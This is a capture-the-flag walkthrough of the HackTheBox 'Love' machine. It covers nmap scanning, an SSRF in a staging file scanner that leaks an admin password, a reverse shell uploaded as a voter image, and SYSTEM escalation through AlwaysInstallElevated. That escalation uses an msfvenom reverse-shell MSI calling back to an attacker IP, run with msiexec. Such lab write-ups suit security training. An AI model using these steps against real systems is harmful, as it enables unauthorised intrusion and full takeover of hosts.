# **Description**

Hello hackers, I hope you are doing well. We are doing [Love](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.239                                                                                                                      [56/66]

We have an Apache http web server on port 80, SSL on 443, SMB on port 445, mysql on 3306 and another Apache web server on port 5000

The ssl certificate reveals the hostname `staging.love.htb`, so let's add that to /etc/hosts with `love.htb`.

## Web

Let's check `love.htb`.

![](1.png)

We have a voting system, nothing interesting.

Let's go to `staging.love.htb`

![](2.png)

Here we have a secure file scanner with a demo page, let's leave it for now.

Let's check the web page on port 5000.

![](3.png)

We can't access the page.

Back to `staging.love.htb`, let's go to the demo page.

![](4.png)

Here we can enter the url for a file to scan.

Since we can't access the page on port 5000, let's submit `http://127.0.0.1:5000` and see what happens.

![](5.png)

We got admin's password.

Back to `love.htb` we find an admin page at `/admin`.

![](6.png)

We login as admin and the password we got.

# **Foothold**

Going tot `Voters` tab, we see we can upload images, let's instead upload a reverse shell.

![](9.png)

We got a shell.

# **Privilege Escalation**

## Metasploit

After upgrading to a meterpreter session, we run exploit suggester.

![](10.png)

Let's use `exploit/windows/local/always_install_elevated`

![](11.png)

We got System

## Manual

We run `winpeas` and find the following results.

![](12.png)

We find that `AlwaysInstallElevated` is set to 1 this means that we can install `.msi` files as `NT AUTHORITY\SYSTEM`.

First let's create an `msi` file using `msfvenom`.

```terminal
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.90 LPORT=9002 -f msi -o hack.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes 
Saved as: hack.msi
```

Now we upload the file and execute using the following command:

```bash
msiexec /quiet /qn /i hack.msi
```
